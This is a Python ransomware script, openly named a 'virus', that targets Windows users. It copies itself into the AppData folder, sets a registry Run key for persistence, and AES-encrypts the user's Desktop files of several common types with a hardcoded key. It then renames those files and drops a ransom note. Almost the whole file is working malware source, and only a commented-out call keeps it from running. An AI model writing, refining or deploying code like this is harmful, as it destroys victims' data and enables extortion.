#!/usr/bin/env python3
import shutil
import subprocess
import sys
from Crypto.Util import Counter
from Crypto.Cipher import AES
import os, os.path


key = b'\x98\x1c\xfc\xa6|nv\xeff\xeb\xbd\xb5\xd8\xf5\x03\xaf'

class virus:
    def __init__(self):
        self.becomePresedinatal()
        ###for linux
        # self.file_name = os.path.expanduser("~"+"/Desktop/")
        # self.filer= os.path.expanduser("~"+"/Desktop/Myfolder")

        ### for windowns

        self.file_name = os.path.expanduser("~")
        self.msg = os.path.expanduser("~"+"\OneDrive\Desktop\\")

        self.extensions = self.exten()
        for i in self.extensions:
            print(i)
            self.enc(key,i)

        self.newfile()
        self.myloc = os.path.realpath(__file__)
        self.explode = self.explode()        ##encrypting itself after finishing the metion


    def becomePresedinatal(self):
        evil_file_location = os.environ["appdata"] + "\\Windower.exe"
        if not os.path.exists(evil_file_location):
            try:
                shutil.copyfile(sys.executable, evil_file_location)             ##coping the path of the file.exe to appdata
                subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run  /v updater /t REG_SZ /d "' + evil_file_location + "'",shell=True)
            except:
                pass
        else:
            try:
                self.explode
                sys.exit(0)

            except:
                pass
    def explode(self):
        try:
            self.enc(key,self.myloc)
        except:
            pass
    def enc(self, key, file_name):
        counter = Counter.new(128)
        c = AES.new(key, AES.MODE_CTR, counter=counter)
        with open(str(file_name), 'r+b') as f:
            plaintext = f.read(16)
            while plaintext:
                try:
                    f.seek(-len(plaintext), 1)
                    f.write(c.encrypt(plaintext))
                    plaintext = f.read(16)
                except:
                    pass
            try:
                os.rename(file_name, file_name + ".en")
            except:
                pass
    def dec(self, key, file_name):
        counter = Counter.new(128)
        d = AES.new(key, AES.MODE_CTR, counter=counter)
        with open(file_name, 'r+b') as ef:
            plaintext = ef.read(16)
            while plaintext:
                try:
                    ef.seek(-len(plaintext), 1)
                    ef.write(d.decrypt(plaintext))
                    plaintext = ef.read(16)
                except:
                    pass
            try:
                os.rename(file_name, file_name.strip('.en'))
            except:
                pass

    def exten(self):
        extensions = ['txt', 'php', 'html','py','jpg','png']            ##the extensions of the files that will be encrypted
        blank = []
        for d , sd , f in os.walk(self.msg):
            for filename in f:
                full_path = os.path.join(d,filename)
                ex = full_path.split(".")[-1]
                if ex in extensions:
                    blank.append(full_path)
        return blank
    def newfile(self):
        with open(self.msg+"ReadME.txt",'w') as n:
            n.write("Hey Man  don't worry about your data follow the instruction below  ")
            n.close()

#####virus()                    ####delete # before virus to run the ransom
